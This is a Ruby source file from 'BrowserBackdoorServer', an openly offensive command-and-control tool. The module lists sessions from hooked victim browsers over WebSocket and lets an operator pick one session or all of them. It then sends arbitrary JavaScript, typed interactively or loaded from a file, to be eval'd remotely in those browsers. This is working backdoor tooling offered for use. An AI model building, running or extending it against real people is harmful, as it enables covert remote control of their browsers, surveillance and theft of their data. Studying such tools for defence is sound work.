#
# Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
# BrowserBackdoorServer by IMcPwn.
# See the file 'LICENSE' for copying permission
#

require_relative 'printcolor'
require_relative 'websocket'

module Bbs

module Command
    def Command.sendAllSessions(cmd, wsList)
        wsList.each_with_index {|_item, index|
            Bbs::WebSocket.sendCommand(cmd, wsList[index])
        }
    end

    def Command.infoCommand(info_commands, selected, wsList)
        info_commands.each {|_key, cmd|
            begin
                if selected != -1
                    Bbs::WebSocket.sendCommand(cmd, wsList[selected])
                else
                    sendAllSessions(cmd, wsList)
                end
            rescue => e
                puts e.message
                Bbs::PrintColor.print_error("Error sending command. Selected session may no longer exist.")
                break
            end
        }
    end

    def Command.sessionsCommand(selected, wsList)
        if wsList.length < 1
            puts "No sessions"
            return
        end
        puts "The session ID with astericks is the currently targeted session."
        puts "If no target is selected (ID -1), all sessions are targeted."
        puts "ID : Identifier"
        wsList.each_with_index {|val, index|
            if index == selected
                current = "*" + index.to_s + "*" + " : " + val.to_s
            else
                current = index.to_s + " : " + val.to_s
            end
            puts current
        }
    end

    def Command.execCommandLoop(wss)
        puts "Commands are sent in an an anonymous function and the eval'd result is returned."
        puts "Enter the command to send (exit when done)."
        while cmdSend = Readline::readline("\ncmd ##{wss.getSelected()} > ".colorize(:magenta), true)
            if !Bbs::WebSocket.validSession?(wss.getSelected(), wss.getWsList())
                break
            end
            break if cmdSend == "exit"
            next if cmdSend == "" || cmdSend == nil
            selected = wss.getSelected()
            wsList = wss.getWsList()
            begin
                if selected != -1
                    Bbs::WebSocket.sendCommand(cmdSend, wsList[selected])
                else
                    sendAllSessions(cmdSend, wsList)
                end
            rescue => e
                Bbs::PrintColor.print_error("Error sending command: " + e.message)
            end
        end
    end

    def Command.execCommand(wss, cmdIn)
        selected = wss.getSelected()
        wsList = wss.getWsList()
        if cmdIn.length < 2
            execCommandLoop(wss)
        else
            begin
                file = File.open(cmdIn[1], "r")
                cmdSend = file.read
                file.close
            rescue => e
                Bbs::PrintColor.print_error("Error opening file to execute: " + e.message)
                return
            end
            if selected != -1
                Bbs::WebSocket.sendCommand(cmdSend, wsList[selected])
            else
                sendAllSessions(cmdSend, wsList)
            end
            if cmdSend.lines.first.chomp == "// INTERACTIVE"
                execCommandLoop(wss)
            end
        end
    end

    def Command.targetCommand(wss, cmdIn)
        if cmdIn.length < 2
            Bbs::PrintColor.print_error("Usage is target SESSION_ID. Type help for help.")
            return
        end
        selectIn = cmdIn[1].to_i
        if selectIn > wss.getWsList().length - 1
            Bbs::PrintColor.print_error("Session does not exist.")
            return
        end
        if Bbs::WebSocket::validSession?(selectIn, wss.getWsList())
            wss.setSelected(selectIn)
        else
            return
        end
        Bbs::PrintColor.print_notice("Selected session is now " + wss.getSelected().to_s + ".")
    end

    def Command.helpCommand(commands)
        commands.each do |key, array|
            print key
            print " --> "
            puts array
            puts
        end
    end

    def Command.getCertCommand()
        if File.file?("./getCert.sh")
            system("./getCert.sh")
            return
        end
        print "Enter the location of getCert.sh: "
        path = gets.chomp
        if File.file?(path)
            system("./" + path)
        else
            Bbs::PrintColor.print_error(path + " does not exist")
        end
    end

    def Command.clearCommand()
        puts "\e[H\e[2J"
    end

    def Command.lsCommand(cmdIn)
        if cmdIn.length < 2
            puts Dir["*"]
        else
            puts Dir[cmdIn[1] + "/*"]
        end
    end
end

end

